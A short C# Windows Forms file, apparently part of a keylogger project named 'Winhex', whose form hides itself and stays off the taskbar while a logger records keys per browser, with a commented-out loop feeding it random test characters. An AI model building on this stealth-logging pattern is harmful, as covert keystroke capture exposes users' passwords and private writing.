using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using Winhex.Interfaces;
using Winhex.Models;

namespace Winhex
{
    public partial class Form1 : Form
    {
        private ILogCreator loger;
        public Form1()
        {
            InitializeComponent();
            Visible = false;
            Application.ApplicationExit += (sender, args) => loger?.Close();
            ShowInTaskbar = false;

            var syms = new[]
            {
                'a', 'b', 'c', 'd', 'e',
                'g', 'h', 'i', 'j', ' '
            };
            loger = new UserLogCreator();

            int c = 0;
            //while (true)
            //{
            //    Random rand = new Random();
            //    if (c > 40) c = 0;
            //    if (c > 20) loger.AddKey("Chrome", syms[rand.Next(0, 9)]);
            //    else loger.AddKey("Yandex", syms[rand.Next(0, 9)]);
            //    Thread.Sleep(1000);
            //    c++;

            //}
        }
    }
}
